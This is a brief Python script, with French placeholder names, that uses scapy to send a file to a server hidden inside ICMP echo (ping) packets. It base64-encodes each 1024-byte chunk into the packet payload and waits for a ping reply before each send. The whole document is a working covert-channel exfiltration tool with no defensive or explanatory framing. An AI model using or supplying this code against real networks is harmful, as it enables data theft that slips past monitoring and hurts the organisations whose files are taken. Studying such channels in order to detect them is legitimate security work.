import base64
from scapy.all import *

filename = "fichier à transferer"

with open(filename, "rb") as f:
    while True:
        ok=False
        while not ok:
          packet=IP(dst="IP-serveur")/ICMP(type=8)/Raw('test')
          resp=sr1(packet)
          if resp:
              ok=True
        bytes_read = f.read(1024)
        if not bytes_read:
            break

        b64_payload = base64.b64encode(bytes_read)
        packet=IP(dst="IP-serveur")/ICMP(type=8)/Raw(b64_payload)
        send(packet,count=1)

